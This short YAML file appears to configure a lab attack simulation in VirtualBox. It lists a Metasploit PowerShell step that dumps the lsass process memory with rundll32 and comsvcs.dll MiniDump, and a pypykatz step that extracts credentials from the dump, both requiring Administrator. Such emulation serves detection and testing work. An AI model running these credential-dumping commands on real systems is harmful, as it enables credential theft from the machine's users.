simulation:
  environment: VirtualBox
  tools:
    - type: C2
      name: Metasploit
      module: powershell
      script: powershell_execute "C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Temp\lsass-comsvcs.dmp full"
    - type: application
      name: pypykatz
      module: minidump
      script: pypykatz lsa minidump /home/kali/lsass-comsvcs.dmp
  permissions_required:
    - Administrator
